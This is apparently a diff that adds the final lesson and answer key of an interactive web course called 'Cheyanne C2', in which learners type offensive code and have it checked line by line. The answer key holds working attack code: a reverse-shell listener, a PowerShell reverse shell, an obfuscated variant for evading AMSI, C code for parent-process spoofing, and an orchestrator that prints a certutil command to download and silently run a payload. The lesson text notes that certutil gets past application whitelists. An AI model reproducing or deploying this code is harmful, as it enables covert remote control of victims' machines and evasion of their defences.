+          <div class="code-ref-label">// TARGET CODE — kill chain orchestrator:</div>
+          <pre>import threading, socket, subprocess, sys, os, time
+
+def auto_op(target_ip, port=4443, serve_port=8080):
+    payload_path = build_payload(target_ip, port)
+    print(f"[*] Payload: {payload_path}")
+
+    server_thread = threading.Thread(
+        target=serve_files, args=(serve_port,), daemon=True
+    )
+    server_thread.start()
+    print(f"[*] File server on :{serve_port}")
+
+    cmd = (f"certutil -urlcache -split -f "
+           f"http://{get_local_ip()}:{serve_port}/payload.exe "
+           f"C:\\Users\\Public\\svc.exe && "
+           f"start /B C:\\Users\\Public\\svc.exe")
+    print(f"[*] Deliver via: {cmd}")
+
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind(("0.0.0.0", port))
+    srv.listen(1)
+    print(f"[*] Waiting for callback on :{port}...")
+    conn, addr = srv.accept()
+    print(f"[+] Shell from {addr[0]}")
+    watch_session(conn)</pre>
+        </div>
+      </div>
+
+      <div class="editor-area">
+        <div class="editor-label">// YOUR CODE:</div>
+        <textarea class="code-editor" id="editor-6" placeholder="import threading, socket, subprocess, sys, os, time
+
+def auto_op(target_ip, port=4443, serve_port=8080):
+    # 1. Build the payload targeting target_ip:port
+    # 2. Start HTTP file server in daemon thread
+    # 3. Print the delivery command for the operator
+    # 4. Listen for TCP callback
+    # 5. Hand off to watch_session()
+    ..."></textarea>
+        <div class="editor-controls">
+          <button class="btn-check" onclick="checkCode(6)">▶ CHECK CODE</button>
+          <button class="btn-skip" onclick="skipLesson(6)">→ SKIP</button>
+        </div>
+        <div class="result-panel" id="result-6"></div>
+        <div class="explain-box" id="explain-6">
+          <h3>// WHAT JUST HAPPENED — YOU BUILT CHEYANNE</h3>
+          <p>That's the full chain. Listener 1 (TCP) accepts the shell. Listener 2 (HTTP) serves the payload. The operator only needs to paste the certutil command once. After that, it's automated.</p>
+          <p><code>certutil</code> is a built-in Windows tool for certificate management — it also downloads files. Signed by Microsoft. Most application whitelists pass it. <code>certutil -urlcache -split -f &lt;url&gt; &lt;dest&gt;</code> downloads to disk.</p>
+          <p><code>start /B</code> runs without a visible window and returns immediately — so the stager command completes and the session doesn't hang waiting for the payload to exit.</p>
+          <p><code>watch_session(conn)</code> is the VNC loop — it sends the <code>screen</code> command periodically, receives base64-encoded JPEG data in <code>[SCR]...[/SCR]</code> tags, decodes and serves them on HTTP :8892.</p>
+          <p><strong>The full implementation</strong> lives at <code>cheyanne/auto_op.py</code>. The menu (<code>vader_menu.py</code>) wires all of this to hotkeys: [Q] drop recon, [I] import, [B] build, [P] phase deploy, [W] watch.</p>
+        </div>
+        <button class="btn-next" id="next-6" onclick="showComplete()">🎯 COURSE COMPLETE</button>
+      </div>
+
+      <div class="lesson-nav-bar">
+        <button class="btn-prev" onclick="goLesson(5)">← PREV</button>
+        <button class="btn-skip" onclick="skipLesson(6)">SKIP →</button>
+      </div>
+    </div>
+
+    <!-- COMPLETE SCREEN -->
+    <div class="complete-screen" id="complete-screen">
+      <h2>// CHEYANNE C2 — COMPLETE</h2>
+      <p>You built a dual-channel C2 framework from scratch.<br>TCP reverse shell. AMSI bypass. Zero-width steganography. Parent process spoofing. Kill chain automation.</p>
+      <p><a href="index.html">← Back to Course Catalog</a> &nbsp;|&nbsp; <a href="ghost.html">Next: Ghost Encoder →</a></p>
+      <br>
+      <p style="color:var(--dim);font-size:0.75rem">Source: <a href="https://github.com/rainfantry/cheyanne" style="color:var(--dim)">rainfantry/cheyanne</a> (private) — v2.0, 2026-06-25</p>
+    </div>
+
+  </main>
+</div>
+
+<script>
+const COURSE_KEY = '22div_course_cheyanne';
+const TOTAL = 6;
+
+const EXPECTED = {
+  1: `import socket
+def listen(port=4443):
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind(("0.0.0.0", port))
+    srv.listen(1)
+    print(f"[*] Listening on :{port}")
+    conn, addr = srv.accept()
+    print(f"[+] Connection from {addr[0]}")
+    while True:
+        cmd = input("shell> ").strip()
+        if not cmd:
+            continue
+        conn.send((cmd + "\\n").encode())
+        output = conn.recv(65535)
+        print(output.decode(errors="replace"), end="")`,
+
+  2: `$ip = "10.0.0.1"
+$port = 4443
+$client = New-Object Net.Sockets.TcpClient($ip, $port)
+$stream = $client.GetStream()
+$writer = New-Object IO.StreamWriter($stream)
+$writer.AutoFlush = $true
+$reader = New-Object IO.StreamReader($stream)
+$writer.WriteLine("OK")
+while ($true) {
+    $cmd = $reader.ReadLine()
+    if (-not $cmd) { break }
+    try {
+        $out = (cmd.exe /c $cmd 2>&1) | Out-String
+    } catch {
+        $out = "ERROR: $_"
+    }
+    $writer.WriteLine($out)
+}`,
+
+  3: `$h = "10.0.0.1"
+$p = 4443
+$T1 = 'Net.S'+'ock'+'ets.T'+'cp'+'Cli'+'ent'
+$T2 = 'IO.St'+'ream'+'Wri'+'ter'
+$T3 = 'IO.St'+'ream'+'Rea'+'der'
+$client = New-Object -T $T1 -A ($h, $p)
+$stream = $client.GetStream()
+$writer = New-Object -T $T2 -A $stream
+$writer.AutoFlush = $true
+$reader = New-Object -T $T3 -A $stream
+$writer.WriteLine("OK")`,
+
+  4: `def encode_bytes(data: bytes) -> str:
+    encoded = []
+    for byte in data:
+        high = (byte >> 4) & 0x0F
+        low = byte & 0x0F
+        encoded.append(GHOST_ALPHABET[high])
+        encoded.append(GHOST_ALPHABET[low])
+    return ''.join(encoded)`,
+
+  5: `HANDLE get_explorer_handle() {
+    DWORD pid = 0;
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe = {0};
+    pe.dwSize = sizeof(pe);
+    if (Process32First(snap, &pe)) {
+        do {
+            if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
+                pid = pe.th32ProcessID;
+                break;
+            }
+        } while (Process32Next(snap, &pe));
+    }
+    CloseHandle(snap);
+    return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+}
+void spawn_spoofed(const char *cmd, HANDLE parent) {
+    STARTUPINFOEXA si = {0};
+    PROCESS_INFORMATION pi = {0};
+    SIZE_T size = 0;
+    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
+    LPPROC_THREAD_ATTRIBUTE_LIST attrs =
+        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
+    InitializeProcThreadAttributeList(attrs, 1, 0, &size);
+    UpdateProcThreadAttribute(attrs, 0,
+        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parent,
+        sizeof(parent), NULL, NULL);
+    si.StartupInfo.cb = sizeof(si);
+    si.lpAttributeList = attrs;
+    CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE,
+        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
+        NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
+}`,
+
+  6: `import threading, socket, subprocess, sys, os, time
+def auto_op(target_ip, port=4443, serve_port=8080):
+    payload_path = build_payload(target_ip, port)
+    print(f"[*] Payload: {payload_path}")
+    server_thread = threading.Thread(
+        target=serve_files, args=(serve_port,), daemon=True
+    )
+    server_thread.start()
+    print(f"[*] File server on :{serve_port}")
+    cmd = (f"certutil -urlcache -split -f "
+           f"http://{get_local_ip()}:{serve_port}/payload.exe "
+           f"C:\\\\Users\\\\Public\\\\svc.exe && "
+           f"start /B C:\\\\Users\\\\Public\\\\svc.exe")
+    print(f"[*] Deliver via: {cmd}")
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind(("0.0.0.0", port))
+    srv.listen(1)
+    print(f"[*] Waiting for callback on :{port}...")
+    conn, addr = srv.accept()
+    print(f"[+] Shell from {addr[0]}")
+    watch_session(conn)`
+};
+
+function loadProgress() {
+  return JSON.parse(localStorage.getItem(COURSE_KEY) || '{}');
+}
+function saveProgress(progress) {
+  localStorage.setItem(COURSE_KEY, JSON.stringify(progress));
+  updateProgressUI(progress);
+}
+function updateProgressUI(progress) {
+  const done = Object.values(progress).filter(Boolean).length;
+  const pct = Math.round((done / TOTAL) * 100);
+  document.getElementById('overall-prog').style.width = pct + '%';
+  document.getElementById('overall-label').textContent = `${done} / ${TOTAL} complete`;
+  for (let i = 1; i <= TOTAL; i++) {
+    const el = document.getElementById(`nav-${i}`);
+    if (el) {
+      el.classList.toggle('done', !!progress[i]);
+    }
+  }
+}
+
+let currentLesson = 1;
+
+function goLesson(n) {
+  document.getElementById(`lesson-${currentLesson}`)?.classList.remove('active');
+  document.getElementById(`nav-${currentLesson}`)?.classList.remove('active');
+  document.getElementById('complete-screen').classList.remove('show');
+  currentLesson = n;
+  const el = document.getElementById(`lesson-${n}`);
+  if (el) {
+    el.classList.add('active');
+    document.getElementById(`nav-${n}`)?.classList.add('active');
+    window.scrollTo(0, 0);
+  }
+}
+
+function showComplete() {
+  document.getElementById(`lesson-${currentLesson}`)?.classList.remove('active');
+  document.getElementById('complete-screen').classList.add('show');
+  window.scrollTo(0, 0);
+}
+
+function normalize(code) {
+  return code.split('\n')
+    .map(l => l.trim())
+    .filter(l => l !== '' && !l.startsWith('#') && !l.startsWith('//'))
+    .join('\n');
+}
+
+function escHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function checkCode(n) {
+  const user = normalize(document.getElementById(`editor-${n}`).value);
+  const exp = normalize(EXPECTED[n] || '');
+  const userLines = user.split('\n');
+  const expLines = exp.split('\n');
+  let correct = 0;
+  let html = '';
+  const total = expLines.length;
+  for (let i = 0; i < total; i++) {
+    const uLine = userLines[i] || '';
+    const eLine = expLines[i];
+    if (uLine === eLine) {
+      correct++;
+      html += `<div class="line-ok">✓ ${escHtml(eLine)}</div>`;
+    } else {
+      html += `<div class="line-err">✗ Expected: ${escHtml(eLine)}${uLine ? '<br>&nbsp;&nbsp;Got:      ' + escHtml(uLine) : '<br>&nbsp;&nbsp;(missing line)'}</div>`;
+    }
+  }
+  const resultEl = document.getElementById(`result-${n}`);
+  const editor = document.getElementById(`editor-${n}`);
+  if (correct === total) {
+    resultEl.innerHTML = `<div class="result-pass">✓ CORRECT — ${correct}/${total} lines match. Well done.</div>` + html;
+    editor.classList.add('pass'); editor.classList.remove('fail');
+    document.getElementById(`explain-${n}`)?.classList.add('show');
+    document.getElementById(`next-${n}`)?.classList.add('show');
+    const prog = loadProgress();
+    prog[n] = true;
+    saveProgress(prog);
+  } else {
+    resultEl.innerHTML = `<div class="result-fail">✗ ${correct}/${total} lines correct — keep going</div>` + html;
+    editor.classList.add('fail'); editor.classList.remove('pass');
+  }
+}
+
+function skipLesson(n) {
+  const prog = loadProgress();
+  prog[n] = true;
+  saveProgress(prog);
+  document.getElementById(`explain-${n}`)?.classList.add('show');
+  document.getElementById(`next-${n}`)?.classList.add('show');
+  if (n < TOTAL) goLesson(n + 1);
+  else showComplete();
+}
+
+// Init
+updateProgressUI(loadProgress());
+
+// Tab key in editors
+document.querySelectorAll('.code-editor').forEach(ta => {
+  ta.addEventListener('keydown', e => {
+    if (e.key === 'Tab') {
+      e.preventDefault();
+      const s = ta.selectionStart, end = ta.selectionEnd;
+      ta.value = ta.value.substring(0, s) + '    ' + ta.value.substring(end);
+      ta.selectionStart = ta.selectionEnd = s + 4;
+    }
+  });
+});
+</script>
+</body>
+</html>
